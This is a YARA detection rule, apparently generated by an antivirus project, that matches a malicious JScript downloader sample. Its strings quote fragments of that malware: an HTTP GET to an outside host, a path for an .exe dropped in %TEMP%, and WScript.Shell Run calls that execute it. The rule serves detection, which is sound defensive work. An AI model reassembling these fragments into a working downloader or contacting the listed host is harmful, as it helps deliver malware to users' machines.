rule sig_20160328_0c2b2cae0f40bacaea86d51abc209ebb {
  meta:
    description = "datamaliciousorder - file 20160328_0c2b2cae0f40bacaea86d51abc209ebb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "341effc8b8c8db1bd4f59de98984f87e41e6838bf091232ceab95b46f4a04a0e"

  strings:
    $s1  = "function Ahesghxqxh() {return Xfsdjaym[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Y6xQ8RF9f.exe\";};" fullword ascii
    $s2  = "Mpnsuie[Sezzrhx](\"GET\", \"http://foothillsofhemet.com/k4sifs\", false);" fullword ascii
    $s3  = "do {WScript[Wbnkjmvx](Scfzn() * 11)} while (Mpnsuie[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Ogneg(Adskdwekr, Bjhyrv){return Adskdwekr - Bjhyrv;};" fullword ascii
    $s5  = "var Xfsdjaym = function Xmraich() {return WScript[Qzztnr](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Eqllldlz() {return ((Ohvbwen == true) && (Ohvbwen == Ookurirc)) ? 1 : Vcvfvn;};" fullword ascii
    $s7  = "Ookurirc = true; " fullword ascii
    $s8  = "var Ookurirc = false;" fullword ascii
    $s9  = "function Iomowsk(Ctdqotsrj){Xfsdjaym[\"Run\"](Ctdqotsrj, Vcvfvn, Vcvfvn);};" fullword ascii
    $s10 = "Ohvbwen = true; " fullword ascii
    $s11 = "function Scfzn(){return 22;};" fullword ascii
    $s12 = "function Ctzgfhmfo(){return Bszvewru;};" fullword ascii
    $s13 = "var Ohvbwen = false;" fullword ascii
    $s14 = "return Ogneg(Fqwcl, Cplpzpepry);" fullword ascii
    $s15 = "function Ofncmyltm(){return Qzztnr;};" fullword ascii
    $s16 = "function Dhpeqogp()" fullword ascii
    $s17 = "function Olffpdscl(Viidm) {var Vfmqkb = (1, 2, 3, 4, 5, Viidm); return Vfmqkb;};" fullword ascii
    $s18 = " while (Hdrblqzh){" fullword ascii
    $s19 = "var Cijggummt = new this[\"Date\"]();" fullword ascii
    $s20 = "var Ngjfjxnley = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}